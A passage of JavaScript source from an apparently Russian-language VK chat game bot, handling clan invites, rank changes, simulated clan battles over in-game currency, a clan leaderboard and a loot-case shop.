      if(stick == 19448) {
        message.sendSticker(19448);
      }
      if (stick == 50465) {
        message.sendSticker(50465);
      }
    }
  }
);
cmd.hear(
  /^(?:пригласить|кпригласить|клан пригласить)\s([0-9]+)$/i,
  async (message, bot) => {
    let clanid = message.user.clanid;
    if (message.user.clanid == false)
      return bot(
        `у вас нет клана, вступите или создайте клан ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clans[clanid].users[message.user.uid].level < 2)
      return bot(
        `в клан могут приглашать только создатель и администратор ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `  `
        ])}`
      );

    const user = await users.find(x => x.uid === Number(message.args[1]));
    if (!user) return bot(`данного игрока не существует.`);
    let clanidi = user.clanid;
    if (clans[clanidi]) return bot(`данный игрок уже состоит в другом клане.`);
    await bot(
      `вы успешно пригласили игрока [id${user.id}|${
        user.tag
      }] в клан! ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}`
    );
    getUnix() + 3600000;
    message.user.lol = getUnix() + 3600000;
    vk.api.messages.send({
      user_id: user.id,
      random_id: 0,
      message: `✉ Игрок [id${message.user.id}|${
        message.user.tag
      }] пригласил Вас в клан «${
        clans[message.user.clanid].name
      }»! ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}
		Для вступления введите «Вступить ${message.user.clanid}» (без кавычек)`
    });
  }
);

cmd.hear(/^(?:повысить|клан повысить|кповысить)$/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if (!clanid)
    return bot(
      `у вас нет клана, вступите или создайте клан ${utils.pick([
        `🤤`,
        `☺`,
        `🙂`,
        `😁`,
        `😏`,
        `🤑`
      ])}`
    );
  return bot(`использование: повысить [ID игрока]

🅰 Админ в клане может приглашать и исключать игроков, изменять клан, проводить атаки.
📜 Модератор в клане может изменять название, исключать игроков.`);
});

cmd.hear(
  /^(?:повысить|клан повысить|кповысить)\s([0-9]+)$/i,
  async (message, bot) => {
    if (message.user.clanid == false)
      return bot(
        `у вас нет клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      );
    const user = await users.find(x => x.uid === Number(message.args[1]));
    if (!user)
      return bot(
        `такого игрока не существует ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (user.uid === message.user.uid)
      return bot(`неверный ID ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`);

    let clanid = user.clanid;
    let clanidi = message.user.clanid;
    if (clans[clanidi].users[message.user.uid].level < 2)
      return bot(
        `вы не создатель/администратор клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clanid !== clanidi)
      return bot(
        `этот человек не состоит в клане ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clans[clanid].users[user.uid].level == 2)
      return bot(`данный игрок имеет максимальный статус в клане.`);
    if (clans[clanid].users[user.uid].level == 3)
      return bot(`данный игрок является создателем клана.`);

    if (clans[clanid].users[user.uid].level < 1) {
      clans[clanid].users[user.uid].level = 1;
      await bot(
        `игрок [id${user.id}|${
          user.tag
        }] был назначен модератором в клане ${utils.pick([
          `🤤`,
          `☺`,
          `🙂`,
          `😁`,
          `😏`,
          `🤑`
        ])}`
      );
      vk.api.messages.send({
        user_id: user.id,
        random_id: 0,
        message: `▶ Вас назначили модератором в клане «${
          clans[message.user.clanid].name
        }» ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}`
      });
    } else {
      if (clans[clanidi].users[message.user.uid].level < 3)
        return bot(
          `до уровня "админ" может повысить только создатель клана ${utils.pick(
            [`😳`, `😒`, `😟`, `🙄`, `??`]
          )}`
        );
      clans[clanid].users[user.uid].level = 2;
      await bot(
        `игрок [id${user.id}|${
          user.tag
        }] был назначен администратором в клане ${utils.pick([
          `🤤`,
          `☺`,
          `🙂`,
          `😁`,
          `😏`,
          `🤑`
        ])}`
      );
     	vk.api.messages.send({
        	user_id: user.id,
        	random_id: 0,
        	message: `▶ Вас назначили администратором в клане «${
          	clans[message.user.clanid].name
        }» ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}`
      });
    }
  }
);

cmd.hear(/^(?:понизить|клан понизить|кпонизить)$/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if (!clanid)
    return bot(
      `у вас нет клана, вступите или создайте клан ${utils.pick([
        `🤤`,
        `☺`,
        `🙂`,
        `😁`,
        `😏`,
        `🤑`
      ])}`
    );
  return bot(`использование: понизить [ID игрока]

🅰 Админ в клане может приглашать и исключать игроков, изменять клан, проводить атаки.
📜 Модератор в клане может изменять название, исключать игроков.`);
});

cmd.hear(
	/^(?:понизить|клан понизить|кпонизить)\s([0-9]+)$/i,
  async (message, bot) => {
    if (message.user.clanid == false)
      return bot(
        `у вас нет клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      );
    const user = await users.find(x => x.uid === Number(message.args[1]));
    if (!user)
      return bot(
        `такого игрока не существует ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (user.uid === message.user.uid)
      return bot(`неверный ID ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`);

    let clanid = user.clanid;
    let clanidi = message.user.clanid;
    if (clans[clanidi].users[message.user.uid].level < 2)
      return bot(
        `вы не создатель/администратор клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clanid !== clanidi)
      return bot(
        `этот человек не состоит в клане ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clans[clanid].users[user.uid].level == 3)
      return bot(`данный игрок является создателем в клане.`);
    if (clans[clanid].users[user.uid].level < 1)
      return bot(`данный игрок является участником в клане.`);

    if (clans[clanid].users[user.uid].level == 1) {
      clans[clanid].users[user.uid].level = 0;
      await bot(
        `игрок [id${user.id}|${
          user.tag
        }] был понижен до прав участника в клане ${utils.pick([
          `🤤`,
          `☺`,
          `🙂`,
          `😁`,
          `😏`,
          `🤑`
        ])}`
      );
      	vk.api.messages.send({
        	user_id: user.id,
        	random_id: 0,
        	message: `▶ Вас понизили до прав участника в клане «${
          	clans[message.user.clanid].name
        }» ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      });
    } else {
      if (clans[clanidi].users[message.user.uid].level < 3)
        return bot(
          `до уровня "модератор" может понизить только создатель клана ${utils.pick(
            [`😳`, `😒`, `😟`, `🙄`, `🤔`]
          )}`
        );
      clans[clanid].users[user.uid].level = 1;
      await bot(
        `игрок [id${user.id}|${
          user.tag
        }] был понижен до прав модератора в клане ${utils.pick([
          `🤤`,
          `☺`,
          `🙂`,
          `😁`,
          `😏`,
          `🤑`
        ])}`
      );
      	vk.api.messages.send({
        	user_id: user.id,
        	random_id: 0,
        	message: `▶ Вас понизили до прав модератора в клане «${
          	clans[message.user.clanid].name
        }» ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}`
      });
    }
  }
);

cmd.hear(
  /^(?:рандом атака|война|⚔ Атаковать|атака рандом|атаковать|клан атака|атака клан)$/i,
  async (message, bot) => {
    var clanid = message.user.clanid;
    if (!clanid)
      return bot(
        `вы не состоите в клане.
Информация по командам: «клан помощь» 🔔`,
        {
          keyboard: JSON.stringify({
            inline: true,
            buttons: [
              [
                {
                  action: {
                    type: "text",
                    payload: '{"button": "5"}',
                    label: "клан помощь"
                  },
                  color: "positive"
                }
              ]
            ]
          })
        }
      );

    if (clans[clanid].users[message.user.uid].level < 2)
      return bot(`вы не создатель/администратор клана ❌`);

    if (clans[clanid].exs > getUnix())
      return bot(`ваша армия слишком устала 😩

	⌚ Новую атаку можно начать через ${unixStampLefta(
        clans[clanid].exs - Date.now()
      )}`);

    const randclan = utils.random(1, clans.number);
    if (!clans[randclan])
      return bot(`подходящего клана не найдено, попробуйте снова ✅`, {
        keyboard: JSON.stringify({
          inline: true,
          buttons: [
            [
              {
                action: {
                  type: "text",
                  payload: '{"button": "5"}',
                  label: "⚔ Атаковать"
                },
                color: "negative"
              }
            ]
          ]
        })
      });

    if (clans[randclan].abramovich > getUnix())
      return bot(`подходящего клана не найдено, попробуйте снова ✅`, {
        keyboard: JSON.stringify({
          inline: true,
          buttons: [
            [
              {
                action: {
                  type: "text",
                  payload: '{"button": "5"}',
                  label: "⚔ Атаковать"
                },
                color: "negative"
              }
            ]
          ]
        })
      });

    let user = users.find(x => x.id === clans[randclan].owner);
    let text = ``;
    if (clans[clanid].abramovich > getUnix())
      text = `\n\n❌ С вашего клана снят щит.`;
    if (clans[randclan].balance < 1) {
      var klmoney = utils.random(100000000, 10000000000);
      if (clans[clanid].zashita == clans[randclan].zashita) {
        return bot(`подходящего клана не найдено, попробуйте снова ✅`, {
          keyboard: JSON.stringify({
            inline: true,
            buttons: [
              [
                {
                  action: {
                    type: "text",
                    payload: '{"button": "5"}',
                    label: "⚔ Атаковать"
                  },
                  color: "negative"
                }
              ]
            ]
          })
        });
      }

      setTimeout(async () => {
        message.send(
          `⚔ [id${message.user.id}|${message.user.tag}], армия отдохнула и готова к бою!`,
          {
            keyboard: JSON.stringify({
              inline: true,
              buttons: [
                [
                  {
                    action: {
                      type: "text",
                      payload: '{"button": "67"}',
                      label: "⚔ Атаковать"
                    },
                    color: "negative"
                  }
                ]
              ]
            })
          }
        );
      }, 300001);

      if (clans[clanid].zashita < clans[randclan].zashita) {
        clans[clanid].abramovich = 5;
        clans[clanid].exs = getUnix() + 300000;

        clans[randclan].good += 1;
        clans[randclan].retin += 1;
        clans[randclan].balance += klmoney;

        clans[clanid].retin -= 1;
        clans[clanid].fuflo += 1;

        resul = Math.floor(clans[clanid].zashita * 0.1);
        clans[clanid].zashita = Math.floor(clans[clanid].zashita * 0.9);

        resulk = Math.floor(resul * 0.5);
        clans[randclan].zashita -= resulk;
        var stick = utils.pick([53108]);

        bot(
          `ваш клан потерпел поражение перед «${
            clans[randclan].name
          }», вы потеряли ${utils.sp(resul)} армии ❌${text}`
        );
        if (stick == 53108) {
          message.sendSticker(53108);
        }
        let user = users.find(x => x.id === clans[randclan].owner)
        if (user.notifications == true) {
          	vk.api.messages.send({
            	user_id: user.id,
            	random_id: 0,
            	message: `⚔ Ваш клан одержал победу перед «${
              	clans[clanid].name
            }», вы потеряли ${utils.sp(resulk)} армии, украдено: ${utils.sp(
              klmoney
            )}$ ✅

🔔 Отписаться от оповещений: «оповещения выкл»`
          });
        }
      } else {
        clans[clanid].abramovich = 5;
        clans[clanid].exs = getUnix() + 300000;

        clans[clanid].good += 1;
        clans[clanid].retin += 1;
        clans[clanid].balance += klmoney;

        clans[randclan].retin -= 1;
        clans[randclan].fuflo += 1;

        resulkk = Math.floor(clans[randclan].zashita * 0.1);
        clans[randclan].zashita = Math.floor(clans[randclan].zashita * 0.9);

        resulkkk = Math.floor(resulkk * 0.5);
        clans[clanid].zashita -= resulkkk;
        var stick = utils.pick([57913]);

        bot(
          `ваш клан одержал победу перед «${
            clans[randclan].name
          }», вы потеряли ${utils.sp(resulkkk)} армии, украдено: ${utils.sp(
            klmoney
          )}$ ✅${text}`
        );
        if (stick == 57913) {
          message.sendSticker(57913);
        }
       	let user = users.find(x => x.id === clans[randclan].owner)
        if(user.notifications == true){
          	vk.api.messages.send({
            	user_id: user.id,
            	random_id: 0,
            	message: `⚔ Ваш клан одержал поражение перед «${
              	clans[clanid].name
            }», вы потеряли ${utils.sp(resulkk)} армии ❌

			🔔 Отписаться от оповещений: «оповещения выкл»`
          });
        }
      }
    } else {
      if (clans[clanid].zashita == clans[randclan].zashita) {
        return bot(`подходящего клана не найдено, попробуйте снова ✅`, {
          keyboard: JSON.stringify({
            inline: true,
            buttons: [
              [
                {
                  action: {
                    type: "text",
                    payload: '{"button": "5"}',
                    label: "⚔ Атаковать"
                  },
                  color: "negative"
                }
              ]
            ]
          })
        });
      }

      setTimeout(async () => {
        message.send(
          `⚔ [id${message.user.id}|${message.user.tag}], армия отдохнула и готова к бою!`,
          {
            keyboard: JSON.stringify({
              inline: true,
              buttons: [
                [
                  {
                    action: {
                      type: "text",
                      payload: '{"button": "67"}',
                      label: "⚔ Атаковать"
                    },
                    color: "negative"
                  }
                ]
              ]
            })
          }
        );
      }, 300001);

      if (clans[clanid].zashita < clans[randclan].zashita) {
        var kpmoney = utils.random(1000000000, clans[clanid].balance);

        clans[clanid].abramovich = 5;
        clans[clanid].exs = getUnix() + 300000;

        clans[randclan].good += 1;
        clans[randclan].retin += 1;
        clans[randclan].balance += kpmoney;

        clans[clanid].balance -= kpmoney;
        clans[clanid].retin -= 1;
        clans[clanid].fuflo += 1;

        resul1 = Math.floor(clans[clanid].zashita * 0.1);
        clans[clanid].zashita = Math.floor(clans[clanid].zashita * 0.9);

        resulk1 = Math.floor(resul1 * 0.5);
        clans[randclan].zashita -= resulk1;
        var stick1 = utils.pick([53108]);

        bot(
          `ваш клан потерпел поражение перед «${
            clans[randclan].name
          }», вы потеряли ${utils.sp(resul1)} армии и ${utils.sp(
            kpmoney
          )}$ ❌${text}`
        );
        if (stick1 == 53108) {
          message.sendSticker(53108);
        }
        let user = users.find(x => x.id === clans[randclan].owner)
        if (user.notifications == true) {
          	vk.api.messages.send({
            	user_id: user.id,
            	random_id: 0,
            	message: `⚔ Ваш клан одержал победу перед «${
             	clans[clanid].name
            }», вы потеряли ${utils.sp(resulk1)} армии, украдено: ${utils.sp(
              kpmoney
            )}$ ✅

🔔 Отписаться от оповещений: «оповещения выкл»`
          });
        }
      } else {
        var kpmoney1 = utils.random(100000000, clans[randclan].balance);
        clans[clanid].abramovich = 5;
        clans[clanid].exs = getUnix() + 300000;

        clans[clanid].good += 1;
        clans[clanid].retin += 1;
        clans[clanid].balance += kpmoney1;

        clans[randclan].balance -= kpmoney1;
        clans[randclan].retin -= 1;
        clans[randclan].fuflo += 1;

        resulkk = Math.floor(clans[randclan].zashita * 0.1);
        clans[randclan].zashita = Math.floor(clans[randclan].zashita * 0.9);

        resulkkk = Math.floor(resulkk * 0.5);
        clans[clanid].zashita -= resulkkk;
        var stick = utils.pick([51594]);

        bot(
          `ваш клан одержал победу перед «${
            clans[randclan].name
          }», вы потеряли ${utils.sp(resulkkk)} армии, украдено: ${utils.sp(
            kpmoney1
          )}$ ✅${text}`
        );
        if (stick == 51594) {
          message.sendSticker(51594);
        }
        let user = users.find(x => x.id === clans[randclan].owner)
        if (user.notifications == true) {
          vk.api.messages.send({
            user_id: user.id,
            random_id: 0,
            message: `⚔ Ваш клан одержал поражение перед «${
              clans[clanid].name
            }», вы потеряли ${utils.sp(resulkk)} армии и ${utils.sp(
              kpmoney1
            )}$ ❌

🔔 Отписаться от уведомлений: «уведомления выкл»`
          });
        }
      }
    }
  }
);



function getUnix() {
  return Date.now();
}
function time() {
  let date = new Date();
  let days = date.getDate();
  let hours = date.getHours();
  let minutes = date.getMinutes();
  let seconds = date.getSeconds();
  if (hours < 10) hours = "0" + hours;
  if (minutes < 10) minutes = "0" + minutes;
  if (seconds < 10) seconds = "0" + seconds;
  var times = hours + ":" + minutes + ":" + seconds;
  return times;
}

function data() {
  var date = new Date();
  let days = date.getDate();
  let month = date.getMonth() + 1;
  let year = date.getFullYear();
  if (month < 10) month = "0" + month;
  if (days < 10) days = "0" + days;
  var datas = days + "." + month + "." + year;
  return datas;
}
cmd.hear(/^(?:Привет)$/i, async(message) => {
	vk.api.messages.send({
		peer_id: message.peerId,
		sticker_id: 53098
	})
});
cmd.hear(/^(?:Пока)$/i, async(message) => {
	vk.api.messages.send({
		peer_id: message.peerId,
		sticker_id: 15950
	})
});

function addZero(i) {
  return i < 10 ? "0" + i : i;
}
function unixStampLefta(stamp) {
  stamp = stamp / 1000;

  let s = stamp % 60;
  stamp = (stamp - s) / 60;

  let m = stamp % 60;
  stamp = (stamp - m) / 60;

  let h = stamp % 24;
  let d = (stamp - h) / 24;

  let text = ``;

  if (d > 0) text += Math.floor(d) + " д. ";
  if (h > 0) text += Math.floor(h) + " ч. ";
  if (m > 0) text += Math.floor(m) + " мин. ";
  if (s > 0) text += Math.floor(s) + " с.";

  return text;
};

cmd.hear(/^(?:⚔ топ кланы|топ кланы|⚔ топ кланов|⚔ клан топ|⚔ кланы топ|кланов топ|🏆 Топ кланы|клан топ|топ клан|лучшие кланы|кланы|🏆 Лучшие кланы)$/i, async (message, bot) => {
let top = []; 
 
 for(let a in clans){ 
  top.push({ balance: clans[a].balance, retin: clans[a].retin, name: clans[a].name, id: message.user.clanid, owner:clans[a].owner}); 
 } 
 
 top.sort((a, b) => { 
  return b.retin - a.retin; 
 }); 
 
 let text = ``; 
 const find = () => { 
  let pos = 1000; 
 
  for (let i = 0; i < top.length; i++) 
  { 
   if(top[i].id === message.senderId) return pos = i; 
  } 
 
  return pos; 
 } 
 
 for (let i = 0; i < 5; i++) 
 { 
  if(!top[i]) return; 
  const clans = top[i]; 
 
  text += `${i === 5 ? `&#128287;` : `${i + 1}&#8419;`} @id${clans.owner}(${clans.name}) — ${clans.retin}👑 | ${utils.rn(clans.balance)} $
  `; 
 } 
 
return bot(`топ кланов:\n${text} 
————————————————— 
 
📢 Рейтинг клана складывается из побед и поражений в атаках.`); 
})

cmd.hear(/^(?:кик)\s([а-я]+)$/i, async (message, bot) => {
try {
	if(message.user.settings.vlad !== true && message.user.settings.eval !== true) return bot(`Ваша привелегия должна быть выше Владельца`)
vk.api.call("messages.getConversationMembers", {
peer_id: 2000000000 + message.chatId,
}).then(function(res){
for(a in res.profiles) {
if(res.profiles[a].last_name == message.args[1]) {
vk.api.messages.removeChatUser({ chat_id: message.chatId, user_id: res.profiles[a].id })
 bot(`Пользователь был исключен из этой беседы.`)
}
}
});
} catch (e) {  bot(e);}
});

cmd.hear(/^(?:сундуки|кейсы)$/i, async (message, bot) => {
let text = ``;

text += `\n1⃣ Стандарт кейс — 15 млрд $\n🛒 Купить: «Кейс 1 [кол-во]»\n\n`;
text += `2⃣ Премиум кейс — 50 млрд $\n🛒 Купить: «Кейс 2 [кол-во]»\n`;

if(message.user.case1 || message.user.case2)
{
text += `\n👜 Ваши кейсы:\n\n`;
if(message.user.case1) text += `📦 Стандарт кейс (х${message.user.case1} шт.)\nОткрыть: «Открыть 1»\n\n`;
if(message.user.case2) text += `📦 Премиум Кейс (х${message.user.case2} шт.)\nОткрыть: «Открыть 2»\n\n`;
}
});

cmd.hear(/^(?:кейс инфо 1)$/i, async (message, bot) => {

return bot(`из "Стандарт кейса" может выпасть:

1⃣ Префиксы. 
2⃣ Игровая валюта.
3⃣ Рейтинг.
4⃣ Премиум Кейс.

🛒 Купить: "кейс 1 [кол-во]"`,
});

cmd.hear(/^(?:кейс инфо 2)$/i, async (message, bot) => {

return bot(`из "Премиум кейса" может выпасть:

1⃣ Опыт
2⃣ Игровая валюта.
3⃣ Рейтинг.
4⃣ Донат рубли. 
5⃣Префиксы

🛒 Купить: "кейс 2 [кол-во]"`,
});
